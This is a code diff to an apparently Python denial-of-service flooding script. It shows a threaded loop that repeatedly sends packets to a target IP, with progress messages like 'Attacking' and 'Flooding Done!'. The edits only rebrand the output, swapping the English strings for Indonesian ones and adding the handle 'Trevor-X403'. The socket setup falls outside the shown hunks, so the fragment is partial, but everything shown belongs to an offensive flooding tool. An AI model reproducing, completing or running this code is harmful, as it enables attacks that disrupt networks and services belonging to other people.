@@ -44,7 +44,7 @@ print("\033[97m----------------------------")
   
   
 def animated_marker():
-    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMarker()]
+    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mHayoloh Rusak Loading: ', progressbar.AnimatedMarker()]
     bar = progressbar.ProgressBar(widgets=widgets).start()
       
     for i in range(50):
@@ -64,10 +64,10 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<-- Attacking " +ip+ " -->" )
+        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<-- Serangan Di Mulai" +ip+ " -->" )
     except:
       s.close()
-      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
+      print("\033[97m[\033[91m-\033[97m]\033[91mSuccesfull Done Trevor-X403")
 
 for x in range(thread):
   thred = threading.Thread(target=start)
